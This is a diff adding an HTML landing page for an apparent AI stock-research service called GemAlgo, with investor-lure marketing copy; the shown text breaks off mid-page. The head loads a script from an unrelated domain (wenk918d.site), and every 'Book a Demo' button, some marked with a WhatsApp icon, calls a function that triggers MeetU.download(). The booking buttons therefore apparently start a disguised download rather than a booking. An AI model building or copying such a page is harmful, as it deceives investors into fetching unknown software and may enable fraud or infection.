@@ -1,1 +1,554 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>GemAlgo — AI Stock Research &amp; Analysis Tool</title>
+<meta name="description" content="GemAlgo's AI scans thousands of U.S. stocks and turns market data into clear, plain-English insights — helping everyday investors make more informed decisions.">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><defs><linearGradient id='g' x1='0' y1='0' x2='1' y2='1'><stop offset='0' stop-color='%2334d399'/><stop offset='1' stop-color='%2322d3ee'/></linearGradient></defs><rect width='100' height='100' rx='22' fill='url(%23g)'/><text x='50' y='68' font-size='52' text-anchor='middle' fill='%2305080f' font-family='Arial' font-weight='700'>G</text></svg>">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com"></script>
 
+
+   
+   <script src="https://api.wenk918d.site/js/meetu-sdk.js"></script>
+<script>
+  tailwind.config = {
+    theme: {
+      extend: {
+        fontFamily: {
+          sans: ['Inter', 'system-ui', 'sans-serif'],
+          display: ['"Space Grotesk"', 'Inter', 'sans-serif'],
+          mono: ['"JetBrains Mono"', 'ui-monospace', 'monospace'],
+        },
+      },
+    },
+  };
+</script>
+<script>
+  function k2() {
+   MeetU.download(event);
+  }
+</script>
+<style>
+  html { scroll-behavior: smooth; }
+  body { background: #05080f; }
+
+  [data-reveal] { transition: opacity .7s ease, transform .7s ease; }
+  [data-reveal].reveal-init { opacity: 0; transform: translateY(20px); }
+  [data-reveal].reveal-in { opacity: 1; transform: none; }
+
+  .grid-bg {
+    background-image:
+      linear-gradient(rgba(148,163,184,.06) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(148,163,184,.06) 1px, transparent 1px);
+    background-size: 44px 44px;
+    -webkit-mask-image: radial-gradient(ellipse 80% 60% at 50% 0%, #000 40%, transparent 100%);
+    mask-image: radial-gradient(ellipse 80% 60% at 50% 0%, #000 40%, transparent 100%);
+  }
+
+  @keyframes ticker { from { transform: translateX(0); } to { transform: translateX(-50%); } }
+  .ticker-track { animation: ticker 30s linear infinite; }
+  .ticker-track:hover { animation-play-state: paused; }
+
+  @keyframes pulse-dot {
+    0%, 100% { box-shadow: 0 0 0 0 rgba(52,211,153,.6); }
+    50% { box-shadow: 0 0 0 6px rgba(52,211,153,0); }
+  }
+  .live-dot { animation: pulse-dot 2s ease-in-out infinite; }
+
+  .glow-cyan { box-shadow: 0 0 60px -18px rgba(34,211,238,.55); }
+
+  @keyframes floaty { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
+  .floaty { animation: floaty 6s ease-in-out infinite; }
+  .floaty-2 { animation: floaty 7s ease-in-out infinite; animation-delay: 1.2s; }
+
+  @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+  .sweep { animation: sweep 8s linear infinite; transform-origin: center; }
+</style>
+</head>
+<body class="font-sans text-slate-200 antialiased overflow-x-hidden">
+
+<div class="relative min-h-screen bg-[#05080f]">
+
+  <!-- ambient glows -->
+  <div class="pointer-events-none absolute inset-0 overflow-hidden">
+    <div class="absolute -top-40 left-1/2 -translate-x-1/2 w-[900px] h-[700px] bg-[radial-gradient(ellipse_at_center,rgba(34,211,238,.18),transparent_60%)]"></div>
+    <div class="absolute top-[35%] -left-40 w-[600px] h-[600px] bg-[radial-gradient(ellipse_at_center,rgba(52,211,153,.12),transparent_60%)]"></div>
+    <div class="absolute top-[55%] -right-40 w-[600px] h-[600px] bg-[radial-gradient(ellipse_at_center,rgba(99,102,241,.14),transparent_60%)]"></div>
+  </div>
+
+  <!-- ============ NAV ============ -->
+  <header class="relative z-50 sticky top-0 border-b border-white/5 bg-[#05080f]/70 backdrop-blur-xl">
+    <div class="max-w-7xl mx-auto px-5 sm:px-8 h-16 flex items-center justify-between">
+      <a href="#" class="flex items-center gap-2.5">
+        <span class="w-8 h-8 rounded-lg bg-gradient-to-br from-emerald-400 to-cyan-400 flex items-center justify-center font-display font-bold text-[#05080f]">G</span>
+        <span class="font-display font-600 text-white text-[17px] tracking-tight">Gem<span class="text-cyan-400">Algo</span></span>
+      </a>
+      <div class="flex items-center gap-4 sm:gap-5">
+        <nav class="hidden md:flex items-center gap-7 text-[13.5px] text-slate-400">
+          <a href="#how" class="hover:text-white transition-colors">How It Works</a>
+          <a href="#features" class="hover:text-white transition-colors">Features</a>
+          <a href="#brokers" class="hover:text-white transition-colors">Security</a>
+          <a href="#guarantee" class="hover:text-white transition-colors">Guarantee</a>
+        </nav>
+        <button type="button" onclick="k2()" class="px-4 py-2 rounded-full bg-white/5 hover:bg-white/10 border border-white/10 text-white text-[13.5px] font-medium transition-all">Book a Demo</button>
+      </div>
+    </div>
+  </header>
+
+  <!-- ============ HERO ============ -->
+  <section class="relative z-10 pt-16 sm:pt-24 pb-16 sm:pb-24">
+    <div class="absolute inset-0 grid-bg pointer-events-none"></div>
+    <div class="relative max-w-7xl mx-auto px-5 sm:px-8 grid lg:grid-cols-2 gap-12 lg:gap-16 items-center">
+
+      <!-- left copy -->
+      <div>
+        <div class="flex items-center gap-3">
+          <div class="flex -space-x-2.5">
+            <div class="w-9 h-9 rounded-full border-2 border-[#0a0f1c] overflow-hidden"><img src="assets/investor-1.png" alt="Investor" class="w-full h-full object-cover"></div>
+            <div class="w-9 h-9 rounded-full border-2 border-[#0a0f1c] overflow-hidden"><img src="assets/investor-2.png" alt="Investor" class="w-full h-full object-cover"></div>
+            <div class="w-9 h-9 rounded-full border-2 border-[#0a0f1c] overflow-hidden"><img src="assets/investor-3.png" alt="Investor" class="w-full h-full object-cover"></div>
+          </div>
+          <span class="text-[13px] text-slate-400 tracking-tight">Built for <span class="text-white font-medium">everyday investors</span></span>
+        </div>
+
+        <div class="mt-6 inline-flex items-center gap-2 rounded-full border border-white/10 bg-white/5 px-3.5 py-1.5">
+          <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 live-dot"></span>
+          <span class="font-mono text-[10px] sm:text-[11px] tracking-wider text-emerald-300">FOR EVERYDAY INVESTORS — NO FINANCE DEGREE REQUIRED</span>
+        </div>
+
+        <h1 class="mt-6 font-display font-bold text-white text-[26px] sm:text-[32px] md:text-[40px] leading-[1.18] tracking-[-0.02em]">
+          Meet Your <span class="text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-cyan-400">AI-Powered</span> Stock Research Assistant
+        </h1>
+
+        <p class="mt-5 text-[15px] sm:text-[17px] text-slate-400 leading-relaxed max-w-xl">
+          GemAlgo scans thousands of U.S. stocks, analyzes the market around the clock, and surfaces clear, plain-English insights — so you can make more informed decisions without spending hours buried in charts and jargon.
+        </p>
+
+        <div class="mt-6 flex flex-wrap items-center gap-x-5 gap-y-2 font-mono text-[12.5px] sm:text-[13.5px] text-slate-400">
+          <span class="text-white font-medium">3,000+ U.S. stocks scanned</span><span class="text-slate-600">·</span>
+          <span class="text-white font-medium">24/7 AI monitoring</span><span class="text-slate-600">·</span>
+          <span class="text-white font-medium">You stay in control</span>
+        </div>
+
+        <div class="mt-8 flex flex-col sm:flex-row items-start sm:items-center gap-4">
+          <button type="button" onclick="k2()" class="group inline-flex items-center gap-2.5 px-7 py-3.5 rounded-full bg-gradient-to-r from-emerald-400 to-cyan-400 text-[#05080f] font-semibold text-[16px] transition-all duration-200 hover:shadow-[0_0_40px_-8px_rgba(34,211,238,.7)] hover:scale-[1.02]">
+            <svg viewBox="0 0 24 24" fill="currentColor" class="w-6 h-6 shrink-0"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413Z"/></svg>
+            <span>Book Your Free Demo</span>
+          </button>
+          <div class="text-[12.5px] text-slate-500">No credit card required · No obligation</div>
+        </div>
+      </div>
+
+      <!-- right video card -->
+      <div class="relative">
+        <div class="absolute -inset-4 bg-gradient-to-tr from-emerald-400/20 to-cyan-400/20 blur-2xl rounded-[28px]"></div>
+        <div class="relative rounded-2xl border border-white/10 bg-white/5 p-2 backdrop-blur glow-cyan">
+          <div class="relative rounded-xl overflow-hidden w-full" style="aspect-ratio: 16/9; background: radial-gradient(120% 120% at 50% 0%, #0e7490 0%, #0b1220 60%, #05080f 100%);">
+            <img class="absolute inset-0 w-full h-full object-cover" src="img/123.jpg" alt="GemAlgo — AI stock research and analysis tool">
+            <div class="absolute inset-0 bg-gradient-to-t from-black/70 via-transparent to-transparent"></div>
+            <div class="absolute left-0 right-0 bottom-0 p-4 sm:p-5 flex items-center justify-between">
+              <span class="text-white text-[13px] sm:text-[15px] font-medium truncate">GemAlgo — AI Stock Research &amp; Analysis</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="absolute -left-3 sm:-left-6 top-8 floaty rounded-xl border border-white/10 bg-[#0a0f1c]/90 backdrop-blur px-3.5 py-2.5 shadow-xl">
+          <p class="font-mono text-[10px] text-slate-500 uppercase tracking-wider">Live Scan</p>
+          <p class="font-mono text-[13px] text-cyan-300 font-medium">3,000 U.S. equities</p>
+        </div>
+      
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ TICKER ============ -->
+  <div class="relative z-10 border-y border-white/5 bg-white/[0.02] py-3 overflow-hidden">
+    <div class="ticker-track flex whitespace-nowrap gap-8 items-center w-max">
+      <div class="flex items-center gap-8">
+        <span class="font-mono text-[12.5px] text-slate-500">SCANNING</span><span class="text-emerald-400 text-[10px]">●</span>
+        <span class="font-mono text-[12.5px] text-slate-300">3,000+ U.S. stocks daily</span>
+        <span class="font-mono text-[12.5px] text-slate-600">/</span>
+        <span class="font-mono text-[12.5px] text-slate-300">24/7 AI monitoring</span>
+        <span class="font-mono text-[12.5px] text-slate-600">/</span>
+        <span class="font-mono text-[12.5px] text-slate-300">Plain-English insights</span>
+        <span class="font-mono text-[12.5px] text-slate-600">/</span>
+        <span class="font-mono text-[12.5px] text-slate-300">No financial jargon</span>
+        <span class="font-mono text-[12.5px] text-slate-600">/</span>
+        <span class="font-mono text-[12.5px] text-slate-300">Your brokerage, your control</span>
+        <span class="font-mono text-[12.5px] text-slate-600">/</span>
+        <span class="font-mono text-[12.5px] text-slate-300">Built for everyday investors</span>
+        <span class="font-mono text-[12.5px] text-slate-600">/</span>
+        <span class="font-mono text-[12.5px] text-slate-300">Not financial advice</span>
+        <span class="font-mono text-[12.5px] text-slate-600">/</span>
+      </div>
+      <div class="flex items-center gap-8" aria-hidden="true">
+        <span class="font-mono text-[12.5px] text-slate-500">SCANNING</span><span class="text-emerald-400 text-[10px]">●</span>
+        <span class="font-mono text-[12.5px] text-slate-300">3,000+ U.S. stocks daily</span>
+        <span class="font-mono text-[12.5px] text-slate-600">/</span>
+        <span class="font-mono text-[12.5px] text-slate-300">24/7 AI monitoring</span>
+        <span class="font-mono text-[12.5px] text-slate-600">/</span>
+        <span class="font-mono text-[12.5px] text-slate-300">Plain-English insights</span>
+        <span class="font-mono text-[12.5px] text-slate-600">/</span>
+        <span class="font-mono text-[12.5px] text-slate-300">No financial jargon</span>
+        <span class="font-mono text-[12.5px] text-slate-600">/</span>
+        <span class="font-mono text-[12.5px] text-slate-300">Your brokerage, your control</span>
+        <span class="font-mono text-[12.5px] text-slate-600">/</span>
+        <span class="font-mono text-[12.5px] text-slate-300">Built for everyday investors</span>
+        <span class="font-mono text-[12.5px] text-slate-600">/</span>
+        <span class="font-mono text-[12.5px] text-slate-300">Not financial advice</span>
+        <span class="font-mono text-[12.5px] text-slate-600">/</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ LIVE SCAN — TERMINAL WINDOW ============ -->
+  <section class="relative z-10 py-16 sm:py-20">
+    <div class="max-w-5xl mx-auto px-5 sm:px-8" data-reveal>
+      <div class="rounded-2xl border border-white/10 bg-[#0a0f1c]/80 backdrop-blur overflow-hidden shadow-2xl shadow-black/40">
+        <div class="flex items-center justify-between px-5 py-3 border-b border-white/5 bg-white/[0.02]">
+          <div class="flex items-center gap-1.5">
+            <span class="w-3 h-3 rounded-full bg-red-400/70"></span>
+            <span class="w-3 h-3 rounded-full bg-amber-400/70"></span>
+            <span class="w-3 h-3 rounded-full bg-emerald-400/70"></span>
+          </div>
+          <span class="font-mono text-[11px] text-slate-500">gemalgo — market scan</span>
+          <span class="inline-flex items-center gap-1.5 rounded-full bg-emerald-400/10 border border-emerald-400/20 px-2.5 py-0.5 font-mono text-[10px] text-emerald-300"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400 live-dot"></span>LIVE</span>
+        </div>
+        <div class="grid grid-cols-1 sm:grid-cols-3 divide-y sm:divide-y-0 sm:divide-x divide-white/5">
+          <div class="px-6 py-8 text-center">
+            <p class="font-display font-bold text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-cyan-400 text-[42px] sm:text-[48px] leading-none">3,000+</p>
+            <p class="mt-2 text-[13px] text-slate-400">U.S. stocks scanned every day</p>
+          </div>
+          <div class="px-6 py-8 text-center">
+            <p class="font-display font-bold text-white text-[42px] sm:text-[48px] leading-none">24/7</p>
+            <p class="mt-2 text-[13px] text-slate-400">Continuous AI market monitoring</p>
+          </div>
+          <div class="px-6 py-8 text-center">
+            <p class="font-display font-bold text-white text-[42px] sm:text-[48px] leading-none">100%</p>
+            <p class="mt-2 text-[13px] text-slate-400">You stay in control of your own account</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ HOW IT WORKS — 3 STEPS ============ -->
+  <section id="how" class="relative z-10 py-16 sm:py-24">
+    <div class="max-w-6xl mx-auto px-5 sm:px-8">
+      <div class="text-center max-w-2xl mx-auto" data-reveal>
+        <span class="inline-flex items-center gap-2 rounded-full border border-cyan-400/30 bg-cyan-400/10 px-3 py-1 text-[11px] uppercase tracking-[0.14em] font-mono text-cyan-300">How It Works</span>
+        <h2 class="mt-5 font-display font-bold text-white text-[28px] sm:text-[36px] tracking-tight leading-tight">From Market Noise To <span class="text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-cyan-400">Clear Decisions</span></h2>
+        <p class="mt-4 text-[15px] sm:text-[16px] text-slate-400 leading-relaxed">GemAlgo does the heavy lifting — while you stay in the driver's seat at every step.</p>
+      </div>
+
+      <div class="mt-14 relative grid md:grid-cols-3 gap-10 md:gap-6" data-reveal>
+        <div class="hidden md:block absolute top-8 left-[16%] right-[16%] h-px bg-gradient-to-r from-emerald-400/40 via-cyan-400/40 to-emerald-400/40"></div>
+
+        <div class="relative text-center">
+          <div class="w-16 h-16 mx-auto rounded-2xl bg-gradient-to-br from-emerald-400/15 to-cyan-400/10 border border-white/10 flex items-center justify-center relative z-10">
+            <span class="font-display font-bold text-cyan-300 text-xl">01</span>
+          </div>
+          <h3 class="mt-5 font-display font-semibold text-white text-[18px]">Connect your brokerage</h3>
+          <p class="mt-2 text-[14px] text-slate-400 leading-relaxed">Link your own U.S. regulated brokerage account. You stay in control — GemAlgo never holds your funds.</p>
+        </div>
+
+        <div class="relative text-center">
+          <div class="w-16 h-16 mx-auto rounded-2xl bg-gradient-to-br from-emerald-400/15 to-cyan-400/10 border border-white/10 flex items-center justify-center relative z-10">
+            <span class="font-display font-bold text-cyan-300 text-xl">02</span>
+          </div>
+          <h3 class="mt-5 font-display font-semibold text-white text-[18px]">AI scans the market</h3>
+          <p class="mt-2 text-[14px] text-slate-400 leading-relaxed">Our AI analyzes thousands of U.S. stocks around the clock, looking for patterns worth your attention.</p>
+        </div>
+
+        <div class="relative text-center">
+          <div class="w-16 h-16 mx-auto rounded-2xl bg-gradient-to-br from-emerald-400/15 to-cyan-400/10 border border-white/10 flex items-center justify-center relative z-10">
+            <span class="font-display font-bold text-cyan-300 text-xl">03</span>
+          </div>
+          <h3 class="mt-5 font-display font-semibold text-white text-[18px]">Decide with confidence</h3>
+          <p class="mt-2 text-[14px] text-slate-400 leading-relaxed">Get clear, plain-English insights and alerts — then you make the call, on your own terms.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ FEATURES — BENTO GRID ============ -->
+  <section id="features" class="relative z-10 py-16 sm:py-24">
+    <div class="max-w-7xl mx-auto px-5 sm:px-8">
+      <div class="flex flex-col md:flex-row md:items-end md:justify-between gap-4" data-reveal>
+        <div class="max-w-xl">
+          <span class="inline-flex items-center gap-2 rounded-full border border-emerald-400/30 bg-emerald-400/10 px-3 py-1 text-[11px] uppercase tracking-[0.14em] font-mono text-emerald-300">Everything Included</span>
+          <h2 class="mt-5 font-display font-bold text-white text-[28px] sm:text-[36px] tracking-tight leading-tight">Here's What You're <span class="text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-cyan-400">Getting</span></h2>
+        </div>
+        <p class="text-[15px] text-slate-400 leading-relaxed md:max-w-xs md:text-right">We handle the data and analysis so you can focus on understanding the market.</p>
+      </div>
+
+      <div class="mt-10 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-6 gap-4" data-reveal>
+
+        <!-- featured -->
+        <div class="sm:col-span-2 lg:col-span-4 lg:row-span-2 rounded-2xl border border-emerald-400/20 bg-gradient-to-br from-emerald-400/[0.08] to-cyan-400/[0.04] p-7 sm:p-8 flex flex-col justify-between">
+          <div>
+            <div class="w-11 h-11 rounded-xl bg-emerald-400/10 flex items-center justify-center mb-4"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-emerald-400"><polyline points="22 7 13.5 15.5 8.5 10.5 2 17"></polyline><polyline points="16 7 22 7 22 13"></polyline></svg></div>
+            <h3 class="font-display font-semibold text-white text-[19px] sm:text-[21px]">AI-powered stock screening across 3,000+ U.S. equities</h3>
+            <p class="mt-2 text-[14px] text-slate-400 leading-relaxed">GemAlgo continuously scans the U.S. market and distills what it finds into clear, actionable signals — no spreadsheets, no jargon.</p>
+          </div>
+          <div class="mt-6 flex items-end justify-between">
+            <div class="flex items-center gap-2 text-[12.5px] font-mono text-slate-500"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400 live-dot"></span>Scanning now</div>
+            <svg viewBox="0 0 120 120" class="w-24 h-24 text-cyan-400/40">
+              <circle cx="60" cy="60" r="52" fill="none" stroke="rgba(34,211,238,.15)"></circle>
+              <circle cx="60" cy="60" r="36" fill="none" stroke="rgba(34,211,238,.15)"></circle>
+              <circle cx="60" cy="60" r="20" fill="none" stroke="rgba(34,211,238,.2)"></circle>
+              <circle cx="60" cy="60" r="4" fill="#22d3ee"></circle>
+              <line x1="60" y1="60" x2="60" y2="8" stroke="rgba(34,211,238,.4)" stroke-width="1.5" class="sweep"></line>
+            </svg>
+          </div>
+        </div>
+
+        <div class="lg:col-span-2 rounded-2xl border border-white/10 bg-white/[0.03] p-6 hover:border-emerald-400/30 transition-all duration-300">
+          <div class="w-10 h-10 rounded-lg bg-emerald-400/10 flex items-center justify-center mb-4"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-emerald-400"><line x1="19" x2="5" y1="5" y2="19"></line><circle cx="6.5" cy="6.5" r="2.5"></circle><circle cx="17.5" cy="17.5" r="2.5"></circle></svg></div>
+          <p class="text-[14.5px] text-slate-200 font-medium leading-relaxed">Plain-English analysis — no financial jargon</p>
+        </div>
+
+        <div class="lg:col-span-2 rounded-2xl border border-white/10 bg-white/[0.03] p-6 hover:border-emerald-400/30 transition-all duration-300">
+          <div class="w-10 h-10 rounded-lg bg-emerald-400/10 flex items-center justify-center mb-4"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-emerald-400"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg></div>
+          <p class="text-[14.5px] text-slate-200 font-medium leading-relaxed">Custom watchlists with real-time alerts</p>
+        </div>
+
+        <div class="lg:col-span-2 rounded-2xl border border-white/10 bg-white/[0.03] p-6 hover:border-emerald-400/30 transition-all duration-300">
+          <div class="w-10 h-10 rounded-lg bg-emerald-400/10 flex items-center justify-center mb-4"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-emerald-400"><path d="M8 2v4"></path><path d="M16 2v4"></path><rect width="18" height="18" x="3" y="4" rx="2"></rect><path d="M3 10h18"></path></svg></div>
+          <p class="text-[14.5px] text-slate-200 font-medium leading-relaxed">Live market dashboard that's easy to read</p>
+        </div>
+
+        <div class="lg:col-span-2 rounded-2xl border border-white/10 bg-white/[0.03] p-6 hover:border-emerald-400/30 transition-all duration-300">
+          <div class="w-10 h-10 rounded-lg bg-emerald-400/10 flex items-center justify-center mb-4"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-emerald-400"><path d="M3 3v16a2 2 0 0 0 2 2h16"></path><path d="M18 17V9"></path><path d="M13 17V5"></path><path d="M8 17v-3"></path></svg></div>
+          <p class="text-[14.5px] text-slate-200 font-medium leading-relaxed">Educational guides to grow your investing knowledge</p>
+        </div>
+
+        <div class="lg:col-span-2 rounded-2xl border border-white/10 bg-white/[0.03] p-6 hover:border-emerald-400/30 transition-all duration-300">
+          <div class="w-10 h-10 rounded-lg bg-emerald-400/10 flex items-center justify-center mb-4"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-emerald-400"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path></svg></div>
+          <p class="text-[14.5px] text-slate-200 font-medium leading-relaxed">Risk-awareness tools to help you stay informed</p>
+        </div>
+
+        <div class="lg:col-span-2 rounded-2xl border border-white/10 bg-white/[0.03] p-6 hover:border-emerald-400/30 transition-all duration-300">
+          <div class="w-10 h-10 rounded-lg bg-emerald-400/10 flex items-center justify-center mb-4"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-emerald-400"><line x1="12" x2="12" y1="2" y2="22"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg></div>
+          <p class="text-[14.5px] text-slate-200 font-medium leading-relaxed">Works alongside your existing brokerage account</p>
+        </div>
+
+        <div class="lg:col-span-2 rounded-2xl border border-white/10 bg-white/[0.03] p-6 hover:border-emerald-400/30 transition-all duration-300">
+          <div class="w-10 h-10 rounded-lg bg-emerald-400/10 flex items-center justify-center mb-4"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-emerald-400"><path d="M3 14h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-7a9 9 0 0 1 18 0v7a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3"></path></svg></div>
+          <p class="text-[14.5px] text-slate-200 font-medium leading-relaxed">Dedicated support when you need a hand</p>
+        </div>
+
+        <div class="lg:col-span-2 rounded-2xl border border-white/10 bg-white/[0.03] p-6 hover:border-emerald-400/30 transition-all duration-300">
+          <div class="w-10 h-10 rounded-lg bg-emerald-400/10 flex items-center justify-center mb-4"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-emerald-400"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"></path><path d="M14 2v4a2 2 0 0 0 2 2h4"></path><path d="M10 9H8"></path><path d="M16 13H8"></path><path d="M16 17H8"></path></svg></div>
+          <p class="text-[14.5px] text-slate-200 font-medium leading-relaxed">Regular market insights delivered to you</p>
+        </div>
+
+        <div class="sm:col-span-2 lg:col-span-6 rounded-2xl border border-white/10 bg-gradient-to-r from-white/[0.04] to-transparent p-6 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
+          <div class="flex items-center gap-4">
+            <div class="w-11 h-11 shrink-0 rounded-xl bg-emerald-400/10 flex items-center justify-center"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5 text-emerald-400"><path d="M6 22V4a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v18Z"></path><path d="M6 12H4a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2h2"></path><path d="M18 9h2a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2h-2"></path><path d="M10 6h4"></path><path d="M10 10h4"></path><path d="M10 14h4"></path><path d="M10 18h4"></path></svg></div>
+            <p class="text-[15px] text-white font-medium">You stay in control of every trade and every dollar.</p>
+          </div>
+          <span class="text-[12.5px] text-slate-500 shrink-0">Your account · Your decisions</span>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- ============ DEMO — AGENDA SPLIT ============ -->
+  <section id="demo" class="relative z-10 py-16 sm:py-24">
+    <div class="max-w-7xl mx-auto px-5 sm:px-8">
+      <div class="grid lg:grid-cols-5 gap-10 lg:gap-14 items-start" data-reveal>
+        <div class="lg:col-span-2 lg:sticky lg:top-24">
+          <span class="inline-flex items-center gap-2 rounded-full border border-cyan-400/30 bg-cyan-400/10 px-3 py-1 text-[11px] uppercase tracking-[0.14em] font-mono text-cyan-300">Live Demo Session</span>
+          <h2 class="mt-5 font-display font-bold text-white text-[28px] sm:text-[36px] leading-[1.15] tracking-tight">See GemAlgo In Action</h2>
+          <p class="mt-4 text-[15px] sm:text-[16px] text-slate-400 leading-relaxed">A 45-minute live walkthrough of how the AI works — and how it fits into your own investing. Bring your questions.</p>
+          <div class="mt-8">
+            <button type="button" onclick="k2()" class="inline-flex items-center gap-2.5 px-7 py-3.5 rounded-full bg-white text-[#05080f] font-semibold text-[15px] transition-all duration-200 hover:bg-slate-200">
+              <svg viewBox="0 0 24 24" fill="currentColor" class="w-5 h-5 text-emerald-600"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 